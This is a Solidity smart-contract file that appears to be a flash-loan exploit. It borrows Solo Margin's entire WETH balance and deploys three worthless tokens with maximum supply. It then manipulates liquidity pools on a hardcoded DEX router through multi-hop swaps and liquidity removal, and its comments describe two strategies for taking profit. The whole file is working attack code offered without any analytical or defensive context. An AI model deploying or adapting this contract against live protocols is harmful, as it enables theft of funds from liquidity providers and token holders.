// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./dydx/contracts/DydxFlashloanBase.sol";

import "./Token.sol";
import "./interfaces/IUniswapRouter.sol";
import "./interfaces/IUniswapFactory.sol";

interface IWETH {
    function deposit() external payable;

    function withdraw(uint) external;
}

contract LuckF is DydxFlashloanBase {
    address private owner;
    address private constant solo_margin = 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e;
    IUniswapV2Router02 private router = IUniswapV2Router02(0xe4FE6a45f354E845F954CdDeE6084603CEDB9410);
    IUniswapV2Router02 private uni_router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    Token public token0;
    Token public token1;
    Token public token2;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    constructor() {
        owner = msg.sender;
        token0 = new Token(MAX_UINT256, "token0", 18, "A");
        token1 = new Token(MAX_UINT256, "token1", 18, "B");
        token2 = new Token(MAX_UINT256, "token2", 18, "C");
        token0.approve(address(router), MAX_UINT256);
        token1.approve(address(router), MAX_UINT256);
        token2.approve(address(router), MAX_UINT256);
        IERC20(WETH).approve(address(solo_margin), MAX_UINT256);
    }


    function good_luck(address[] calldata tokens)
        external
    {
        uint256 _amount = IERC20(WETH).balanceOf(solo_margin);
        ISoloMargin solo = ISoloMargin(solo_margin);

        // Get marketId from token address
        uint256 marketId = _getMarketIdFromTokenAddress(solo_margin, WETH);

        // Calculate repay amount (_amount + (2 wei))
        // Approve transfer from
        uint256 repayAmount = _getRepaymentAmountInternal(_amount);
        IERC20(WETH).approve(solo_margin, repayAmount);

        // 1. Withdraw $
        // 2. Call callFunction(...)
        // 3. Deposit back $
        Actions.ActionArgs[] memory operations = new Actions.ActionArgs[](3);

        operations[0] = _getWithdrawAction(marketId, _amount);
        operations[1] = _getCallAction(
            // Encode MyCustomData for callFunction
            abi.encode(tokens)
        );
        operations[2] = _getDepositAction(marketId, repayAmount);

        Account.Info[] memory accountInfos = new Account.Info[](1);
        accountInfos[0] = _getAccountInfo();

        solo.operate(accountInfos, operations);
    }

    /**
     * Allows users to send this contract arbitrary data.
     *
     * @param  sender       The msg.sender to Solo
     * @param  accountInfo  The account from which the data is being sent
     * @param  data         Arbitrary data given by the sender
     */
    // This is the function that will be called postLoan
    // i.e. Encode the logic to handle your flashloaned funds here
    function callFunction(
        address sender,
        Account.Info memory accountInfo,
        bytes memory data
    ) external {
        address[] memory tokens = abi.decode(data, (address[]));
        uint256 balOfLoanedToken = IERC20(WETH).balanceOf(address(this));
        IWETH(WETH).withdraw(balOfLoanedToken);
        
        emit B(balOfLoanedToken);

        IFactory factory = IFactory(0xF028F723ED1D0fE01cC59973C49298AA95c57472);

        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            address pair = factory.getPair(WETH, token);
            uint token_amt = router.getTokenInPair(pair, token);

            address[] memory _path = new address[](2);
            _path[0] = WETH;
            _path[1] = token;

            router.swapETHForExactTokens{value: address(this).balance}(token_amt * 95 / 100, _path, address(this), block.timestamp);
        }

        uint weth_amt = IERC20(WETH).balanceOf(address(router));
        emit B(weth_amt);
        
        (,,uint lp0) = router.addLiquidityETH{value: weth_amt}(address(token0), 10000, 0, 0, address(this), block.timestamp);
        (,,uint lp1) = router.addLiquidity(address(token1), address(token2), 1e18, 1e18, 0, 0, address(this), block.timestamp);
        (,,uint lp2) = router.addLiquidityETH{value: 1e18}(address(token1), 1e18, 0, 0, address(this), block.timestamp);
        (,,uint lp3) = router.addLiquidityETH{value: 1e18}(address(token2), 1e18, 0, 0, address(this), block.timestamp);

        address[] memory path = new address[](5);
        path[0] = address(token0);
        path[1] = WETH;
        path[2] = address(token1);
        path[3] = address(token2);
        path[4] = WETH;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(1e32, 0, path, address(this), block.timestamp);
        
        // Strategy 1: Get profits by swap:
        // address[] memory path1 = new address[](2);
        // path1[0] = address(token1);
        // path1[1] = WETH;
        // router.swapTokensForExactETH(router.getTokenInPair(0x7fE7F418675eAa761317456551d6980D03CDe543, WETH)-1000, MAX_UINT256, path1, address(this), block.timestamp);

        // Strategy 2: Get profits by remove liquidity
        address pair2 = factory.getPair(WETH, address(token1));
        IERC20(pair2).approve(address(router), MAX_UINT256);
        address pair3 = factory.getPair(WETH, address(token2));
        IERC20(pair3).approve(address(router), MAX_UINT256);
        router.removeLiquidityETH(address(token1), lp2, 0, 0, address(this), block.timestamp);
        router.removeLiquidityETH(address(token2), lp3, 0, 0, address(this), block.timestamp);
        

        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            IERC20(token).approve(address(uni_router), MAX_UINT256);
            address[] memory _path = new address[](2);
            _path[0] = token;
            _path[1] = WETH;
            uint token_amt = IERC20(token).balanceOf(address(this));

            uni_router.swapExactTokensForETH(token_amt, 0, _path, address(this), block.timestamp);
        }

        emit B(address(this).balance);

        IWETH(WETH).deposit{value: balOfLoanedToken+2}();
    } 

    event B(uint weth_amt);

    receive() external payable {}
}